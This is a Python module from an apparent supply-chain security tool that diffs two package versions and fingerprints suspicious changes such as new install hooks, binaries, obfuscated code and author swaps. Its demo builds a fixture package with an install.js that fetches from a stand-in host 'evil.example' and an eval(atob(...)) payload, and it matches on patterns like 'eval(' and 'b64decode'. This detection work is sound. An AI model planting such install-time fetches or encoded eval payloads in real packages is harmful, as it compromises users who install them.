"""Version-diff engine: structural fingerprinting of dependency bumps.

The atomic unit of a supply-chain attack is a *delta*: the same worm across
many packages produces the same structural shape. This module turns a
before/after directory pair into a canonical, stable fingerprint string so
identical worms cluster regardless of package name.

Stdlib only. Contracts live in supplicant.models and supplicant.utils.
"""

from __future__ import annotations

import json
import os
import re
from pathlib import Path

from ..detect.install import manifest_script_hooks
from typing import Any, Optional

from supplicant.models import Artifact, FileChange, VersionDiff
from supplicant.utils import compute_entropy, sha256_file

# --- noise suppression -----------------------------------------------------

# Small ignore list: junk that would otherwise pollute every diff.
IGNORE_FILENAMES = {".ds_store", "thumbs.db", "desktop.ini", ".gitignore.swp"}
IGNORE_DIRNAMES = {"__pycache__", ".git", ".hg", ".svn", ".DS_Store"}


_DIST_INFO_RE = re.compile(r"-[0-9][0-9A-Za-z.+-]*\.dist-info")  # e.g. six-1.16.0.dist-info


def _walk_files(root: Path) -> dict[str, tuple[str, int]]:
    """Map normalized relative path -> (real relative path, size) for every
    file under root (ignoring noise).

    Version-qualified .dist-info directory names are normalized to a fixed
    ".dist-info" so a wheel's METADATA/RECORD set diffs as modified rather
    than as added+removed on every bump. The real path is kept alongside so
    callers can hash/extract the actual file.
    """
    root = Path(root)
    out: dict[str, tuple[str, int]] = {}
    if not root.is_dir():
        return out
    for dirpath, dirnames, filenames in os.walk(root):
        dirnames[:] = [d for d in dirnames if d.lower() not in IGNORE_DIRNAMES]
        for fn in filenames:
            if fn.lower() in IGNORE_FILENAMES:
                continue
            full = Path(dirpath) / fn
            try:
                if not full.is_file():
                    continue
                rel = str(full.relative_to(root))
                out[_DIST_INFO_RE.sub(".dist-info", rel)] = (rel, full.stat().st_size)
            except OSError:
                continue
    return out


def diff_file_trees(before: Path, after: Path) -> list[FileChange]:
    """Recursively diff two directory trees, returning sorted FileChanges.

    present in both + hash differs -> modified; only in after -> added;
    only in before -> removed. Result is sorted by path. Note: file modes are
    intentionally not attached here because FileChange carries no mode field.
    """
    before = Path(before)
    after = Path(after)
    bfiles = _walk_files(before)
    afiles = _walk_files(after)

    changes: list[FileChange] = []
    for rel in sorted(set(bfiles) | set(afiles)):
        in_b = rel in bfiles
        in_a = rel in afiles
        if in_b and in_a:
            b_real, b_size = bfiles[rel]
            a_real, a_size = afiles[rel]
            hb = sha256_file(before / b_real)
            ha = sha256_file(after / a_real)
            if hb != ha:
                changes.append(
                    FileChange(
                        path=rel,
                        status="modified",
                        size_before=b_size,
                        size_after=a_size,
                        hash_before=hb,
                        hash_after=ha,
                    )
                )
        elif in_a:
            a_real, a_size = afiles[rel]
            changes.append(
                FileChange(
                    path=rel,
                    status="added",
                    size_after=a_size,
                    hash_after=sha256_file(after / a_real),
                )
            )
        else:
            b_real, b_size = bfiles[rel]
            changes.append(
                FileChange(
                    path=rel,
                    status="removed",
                    size_before=b_size,
                    hash_before=sha256_file(before / b_real),
                )
            )
    changes.sort(key=lambda c: c.path)
    return changes


# --- manifests -------------------------------------------------------------


def _parse_metadata(text: str) -> dict:
    """Parse a PEP 566 METADATA blob: 'Key: value' lines -> dict.

    Keys starting with 'Requires-' accumulate their values into a list
    (multiple Requires-Dist lines are the norm). Continuation lines are
    folded into the preceding value.
    """
    out: dict[str, Any] = {}
    lines = text.splitlines()
    i = 0
    n = len(lines)
    while i < n:
        line = lines[i]
        i += 1
        if not line.strip() or line[0] in " \t":
            continue
        if ":" not in line:
            continue
        key, _, value = line.partition(":")
        key = key.strip()
        if not key:
            continue
        value = value.strip()
        while i < n and lines[i][:1] in (" ", "\t"):
            value += "\n" + lines[i].strip()
            i += 1
        if key.startswith("Requires-"):
            out.setdefault(key, []).append(value)
        elif key in out:
            existing = out[key]
            if isinstance(existing, list):
                existing.append(value)
            else:
                out[key] = [existing, value]
        else:
            out[key] = value
    return out


def read_manifest(dirpath: Path, ecosystem: str) -> dict:
    """Read a package manifest into a plain dict. Returns {} if missing.

    npm: JSON of <dir>/package.json.
    pypi: simple 'Key: value' parse of the METADATA file inside *.dist-info/.
    """
    dirpath = Path(dirpath)
    if ecosystem == "npm":
        p = dirpath / "package.json"
        if not p.is_file():
            return {}
        try:
            with open(p, "r", encoding="utf-8") as f:
                return json.load(f)
        except (OSError, ValueError):
            return {}
    if ecosystem == "pypi":
        candidates = sorted(dirpath.rglob("*.dist-info/METADATA")) or sorted(dirpath.rglob("PKG-INFO"))
        if not candidates:
            return {}
        try:
            with open(candidates[0], "r", encoding="utf-8") as f:
                parsed = _parse_metadata(f.read())
        except OSError:
            return {}
        # Normalize PEP 566 keys to the npm-shaped fields the fingerprint
        # features read, so author/repo-change detection works for pypi too.
        # Author-email is the stable identity; Author is a display name.
        manifest = dict(parsed)
        if "author" not in manifest:
            manifest["author"] = parsed.get("Author-email") or parsed.get("Author")
        if "repository" not in manifest:
            manifest["repository"] = parsed.get("Home-page")
            urls = parsed.get("Project-URL", [])
            if isinstance(urls, str):
                urls = [urls]
            for url in urls:
                if isinstance(url, str) and url.lower().startswith("source"):
                    manifest["repository"] = url.split(",", 1)[-1].strip()
        return manifest
    return {}


# --- install-hook hints ----------------------------------------------------


INSTALL_HOOK_HINTS: list[str] = [
    "install.js",
    "install.sh",
    "postinstall",
    "preinstall",
    "preinstall.js",
    "postinstall.js",
    "setup.py",
    "setup.mjs",
    "setup.js",
    "build.py",
    "bootstrap",
    "prepare.js",
    "postinstall.sh",
    "preinstall.sh",
]


def is_install_hook_path(relpath: str) -> bool:
    """Case-insensitive substring match against INSTALL_HOOK_HINTS."""
    rp = relpath.lower()
    return any(hint in rp for hint in INSTALL_HOOK_HINTS)


# --- fingerprint features --------------------------------------------------


# Approximating "binary": suffix-first, size second. Exact magic-byte checks
# (utils.file_magic) need file content, which a VersionDiff does not carry, so
# this is deliberately offline and documented as an approximation.
BINARY_EXTENSIONS = {".so", ".dll", ".exe", ".dylib", ".bin", ".o", ".a", ".node", ".wasm"}

TEXT_EXTENSIONS = {
    ".txt", ".md", ".markdown", ".rst", ".js", ".jsx", ".mjs", ".cjs", ".mts",
    ".cts", ".ts", ".tsx", ".json", ".py", ".pyi", ".rb", ".go", ".rs", ".c",
    ".h", ".cpp", ".hpp", ".cc", ".java", ".cs", ".php", ".lua", ".pl", ".r",
    ".m", ".swift", ".kt", ".kts", ".scala", ".clj", ".html", ".htm", ".xhtml",
    ".css", ".scss", ".less", ".sass", ".xml", ".yaml", ".yml", ".toml", ".ini",
    ".cfg", ".conf", ".sh", ".bash", ".zsh", ".fish", ".ps1", ".bat", ".cmd",
    ".vue", ".svelte", ".svg", ".map", ".sql", ".graphql", ".proto", ".lock",
    ".gitignore", ".npmrc", ".editorconfig", ".babelrc", ".eslintrc", ".license",
}

_BASE64_RUN = re.compile(r"[A-Za-z0-9+/]{100,}={0,2}")


def _is_binary_like(path: str, size: int) -> bool:
    ext = Path(path).suffix.lower()
    if ext in BINARY_EXTENSIONS:
        return True
    if size > 10 * 1024 and ext not in TEXT_EXTENSIONS:
        return True
    return False


def _added_content(diff: VersionDiff) -> dict[str, bytes]:
    """Content peek (first 8KB) for added files, when diff_versions attached it.

    VersionDiff has no content field, so diff_versions stashes a private
    ``_added_content`` dict on the instance (allowed: non-slots dataclass).
    Missing attribute / empty dict simply yields no obfuscation hits.
    """
    return getattr(diff, "_added_content", None) or {}


def _looks_obfuscated(diff: VersionDiff, path: str) -> bool:
    sample = _added_content(diff).get(path)
    if not sample:
        return False
    sample = sample[:8192]
    if compute_entropy(sample) > 7.0:
        return True
    lowered = sample.lower()
    if b"eval(" in lowered or b"b64decode" in lowered:
        return True
    return bool(_BASE64_RUN.search(sample.decode("latin-1", "replace")))


def _author_str(manifest: dict) -> str:
    a = manifest.get("author")
    if isinstance(a, str):
        return a.strip()
    if isinstance(a, dict):
        return json.dumps(a, sort_keys=True)
    return ""


def _repo_str(manifest: dict) -> str:
    r = manifest.get("repository")
    if isinstance(r, str):
        return r.strip()
    if isinstance(r, dict):
        url = r.get("url")
        return str(url or "").strip()
    return ""


def _pypi_req_name(req: str) -> Optional[str]:
    if not isinstance(req, str):
        return None
    req = req.split(";", 1)[0].strip()
    if "[" in req:
        req = req.split("[", 1)[0]
    for sep in (">=", "<=", "==", "!=", "~=", "===", ">", "<"):
        idx = req.find(sep)
        if idx != -1:
            req = req[:idx]
            break
    parts = req.strip().split()
    return parts[0] if parts else None


def _dep_names(manifest: dict, ecosystem: str) -> set[str]:
    if ecosystem == "pypi":
        names: set[str] = set()
        for key, vals in manifest.items():
            if not key.startswith("Requires-"):
                continue
            if isinstance(vals, str):
                vals = [vals]
            for v in vals:
                name = _pypi_req_name(v)
                if name:
                    names.add(name)
        return names
    deps = manifest.get("dependencies", {})
    if isinstance(deps, dict):
        return set(deps)
    return set()


def _author_changed(diff: VersionDiff) -> bool:
    return _author_str(diff.manifest_before) != _author_str(diff.manifest_after)


def _repo_changed(diff: VersionDiff) -> bool:
    return _repo_str(diff.manifest_before) != _repo_str(diff.manifest_after)


def _count_deps_added(diff: VersionDiff) -> int:
    eco = diff.artifact.ecosystem if diff.artifact else ""
    before = _dep_names(diff.manifest_before, eco)
    after = _dep_names(diff.manifest_after, eco)
    return len(after - before)


def _size_delta_bytes(diff: VersionDiff) -> int:
    total = 0
    for c in diff.changes:
        if c.status == "added":
            total += c.size_after or 0
        elif c.status == "removed":
            total -= c.size_before or 0
        else:
            total += (c.size_after or 0) - (c.size_before or 0)
    return total


def compute_delta_fingerprint(diff: VersionDiff) -> str:
    """Stable structural fingerprint of a version bump.

    Same worm across many packages => same string. Order is canonical:
    hooks | bins | obf | author | repo | deps | deltabytes | binratio.
    Returns "noop" when nothing changed.
    """
    if not diff.changes:
        return "noop"

    added = [c for c in diff.changes if c.status == "added"]
    removed = [c for c in diff.changes if c.status == "removed"]

    added_hooks = sum(1 for c in added if is_install_hook_path(c.path))
    removed_hooks = sum(1 for c in removed if is_install_hook_path(c.path))
    before_hooks = manifest_script_hooks(diff.manifest_before)
    after_hooks = manifest_script_hooks(diff.manifest_after)
    added_hooks += sum(1 for name, script in after_hooks.items() if before_hooks.get(name) != script)
    removed_hooks += sum(1 for name in before_hooks if name not in after_hooks)
    added_bins = sum(1 for c in added if _is_binary_like(c.path, c.size_after or 0))
    obfuscated = sum(1 for c in added if _looks_obfuscated(diff, c.path))
    author_changed = _author_changed(diff)
    repo_changed = _repo_changed(diff)
    deps_added = _count_deps_added(diff)
    size_delta = _size_delta_bytes(diff)
    bin_ratio = added_bins / max(1, len(added))

    parts = [
        f"hooks:+{added_hooks}/-{removed_hooks}",
        f"bins:+{added_bins}",
        f"obf:{obfuscated}",
        f"author:+{1 if author_changed else 0}",
        f"repo:+{1 if repo_changed else 0}",
        f"deps:+{deps_added}",
        f"deltabytes:{size_delta:+d}",
        f"binratio:{bin_ratio:.2f}",
    ]
    return "|".join(parts)


# --- top-level entry -------------------------------------------------------


def diff_versions(
    before_dir: Path,
    after_dir: Path,
    ecosystem: str,
    name: str,
    from_version: str,
    to_version: str,
) -> VersionDiff:
    """Full normalized diff of two extracted package versions."""
    before_dir = Path(before_dir)
    after_dir = Path(after_dir)
    manifest_before = read_manifest(before_dir, ecosystem)
    manifest_after = read_manifest(after_dir, ecosystem)
    changes = diff_file_trees(before_dir, after_dir)

    diff = VersionDiff(
        artifact=Artifact(ecosystem, name, to_version),
        from_version=from_version,
        to_version=to_version,
        changes=changes,
        manifest_before=manifest_before,
        manifest_after=manifest_after,
    )

    added_content: dict[str, bytes] = {}
    for c in changes:
        if c.status == "added":
            real = _real_path_for(after_dir, c.path)
            if real is not None:
                try:
                    with open(real, "rb") as f:
                        added_content[c.path] = f.read(8192)
                except OSError:
                    continue
    if added_content:
        diff._added_content = added_content

    diff.delta_fingerprint = compute_delta_fingerprint(diff)
    return diff


def _real_path_for(root: Path, normalized_rel: str) -> Path | None:
    """Resolve a normalized relative path to a real file, handling the
    version-qualified .dist-info rewrite (pkg-1.0.0.dist-info/... -> .dist-info)."""
    p = root / normalized_rel
    if p.is_file():
        return p
    if ".dist-info" in normalized_rel:
        head = normalized_rel.split("/", 1)[0]
        if head.endswith(".dist-info"):
            for d in root.iterdir():
                if d.is_dir() and d.name.endswith(".dist-info"):
                    candidate = d / normalized_rel[len(head) + 1:]
                    if candidate.is_file():
                        return candidate
    return None


def diff_summary(diff: VersionDiff) -> list[str]:
    """Human-readable one-line summary strings for CLI/report output."""
    if not diff.changes:
        return ["no changes"]

    lines = [
        f"{len(diff.added)} added, {len(diff.modified)} modified, {len(diff.removed)} removed"
    ]

    for c in diff.added:
        if is_install_hook_path(c.path):
            lines.append(f"added install hook: {c.path}")
        if _is_binary_like(c.path, c.size_after or 0):
            lines.append(f"added binary: {c.path}")
    for c in diff.removed:
        if is_install_hook_path(c.path):
            lines.append(f"removed install hook: {c.path}")

    ab, aa = _author_str(diff.manifest_before), _author_str(diff.manifest_after)
    if ab != aa:
        lines.append(f"author changed: {ab or '(none)'} -> {aa or '(none)'}")
    rb, ra = _repo_str(diff.manifest_before), _repo_str(diff.manifest_after)
    if rb != ra:
        lines.append(f"repository changed: {rb or '(none)'} -> {ra or '(none)'}")

    deps = _count_deps_added(diff)
    if deps:
        noun = "dependency" if deps == 1 else "dependencies"
        lines.append(f"added {deps} {noun}")

    lines.append(f"size delta: {_size_delta_bytes(diff):+d} bytes")
    fp = diff.delta_fingerprint or compute_delta_fingerprint(diff)
    lines.append(f"fingerprint: {fp}")
    return lines


if __name__ == "__main__":
    import pathlib
    import tempfile

    with tempfile.TemporaryDirectory() as td:
        base = pathlib.Path(td)
        before = base / "before"
        after = base / "after"

        for d in (before, after):
            d.mkdir(parents=True)

        (before / "package.json").write_text(
            json.dumps(
                {
                    "name": "demo",
                    "version": "1.0.0",
                    "author": "alice@example.com",
                    "repository": {"type": "git", "url": "git://github.com/alice/demo"},
                    "dependencies": {"leftpad": "1.0.0"},
                }
            ),
            encoding="utf-8",
        )
        (before / "index.js").write_text("module.exports = 1;\n", encoding="utf-8")
        (before / "old.txt").write_text("removed in v2\n", encoding="utf-8")

        (after / "package.json").write_text(
            json.dumps(
                {
                    "name": "demo",
                    "version": "2.0.0",
                    "author": "mallory@example.com",
                    "repository": {"type": "git", "url": "git://github.com/mallory/demo"},
                    "dependencies": {"leftpad": "1.0.0", "evil-utils": "9.9.9"},
                }
            ),
            encoding="utf-8",
        )
        (after / "index.js").write_text(
            "module.exports = 1;\nmodule.exports.foo = 2;\n" * 20, encoding="utf-8"
        )
        (after / "install.js").write_text('fetch("http://evil.example/x");\n', encoding="utf-8")
        (after / "evil.js").write_text(
            'eval(atob("' + "QVRUU0FDS1BBQkxPQkI=" * 40 + '"));\n', encoding="utf-8"
        )
        (after / "native.node").write_bytes(b"\x7fELF" + b"\x00" * 64)

        d = diff_versions(before, after, "npm", "demo", "1.0.0", "2.0.0")
        print("fingerprint:", d.delta_fingerprint)
        for line in diff_summary(d):
            print(" ", line)
